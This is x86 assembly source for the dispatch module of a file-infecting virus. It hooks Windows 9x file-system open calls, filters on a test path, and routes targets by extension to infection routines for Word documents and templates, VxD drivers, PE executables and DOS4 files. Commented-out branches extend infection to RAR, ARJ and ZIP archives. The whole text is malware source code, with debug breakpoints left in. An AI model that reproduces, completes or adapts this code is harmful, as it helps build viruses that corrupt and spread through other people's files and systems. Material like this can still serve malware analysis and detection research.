ifndef PASS2
include globals.1
else
include globals.2
endif


; main strategy module

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature


startup:
                 cmp     initialize, 0
                 je      cont
                 ret
cont:
                 cmp  eax, IFSFN_OPEN
                 je   short @@OpenCreate
                 cmp  eax, 'FLAG'
                 je   short @@set_flags
                 cmp  eax, 'INFO'
                 je   short @@get_info
                 cmp  eax, 'OPEN'
                 je   short @@pe_open
                 ; err
                 ret

@@OpenCreate:
                 ; name in esi
                 cmp     dword ptr [esi], '1\:C' ; C:\1 ?
                 jne     no_interesting

                 call    process_infection
no_interesting:
                 xor  eax, eax
                 ret

@@GetFileSize:

@@WriteFile:

@@ReadFile:

@@CloseFile:
                 jmp  process_yourself

@@set_flags:
                 ret

@@get_info:
                 xor  eax, eax
                 ret

@@pe_open:
                 xor  eax, eax
                 ret

process_yourself:
                 ret

process_INFECTION:
                 call    get_suffix
                 and     eax, 0DFDFDFFFh
                 mov     edx, esi

                 cmp     eax, 'COD.'
                 je      itisdoc
                 cmp     eax, 'TOD.'
                 je      itisdoc
                 cmp     eax, 'DXV.'
                 je      itisvxd
                 cmp     eax, 'EXE.'
                 je      itisexe
                 ; unknown target
                 xor     eax, eax
                 ret
itisdoc:         int 3
                 mod_call md_infDOC
                 ret
itisvxd:         int 3
                 mov     al, INF_VXD
processvxd:      mod_call md_infLE
locret:          ret

itisexe:         int 3
                 push    edx
                 mov     al, INF_NT_EXE
                 mod_call md_infPE
                 pop     edx
                 or      eax, eax
                 jnz     locret
                 ;marker 'PE EXE failed'
                 mov     al, INF_DOS4
                 jmp     processvxd
;itisrar:         mov     al, INF_PAK_RAR
;processrar:      mod_call md_infPAK
;                 ret
;itisarj:         mov     al, INF_PAK_ARJ
;                 jmp     processrar
;itiszip:         mov     al, INF_PAK_ZIP
;                 jmp     processrar



get_suffix:      push    ecx edi
                 mov     edi, esi
                 mov     al, 0
                 mov     ecx, 256
                 repne   scasb
                 mov     eax, [edi-5]
                 pop     edi ecx
                 ret


indep_mod       ends

                end
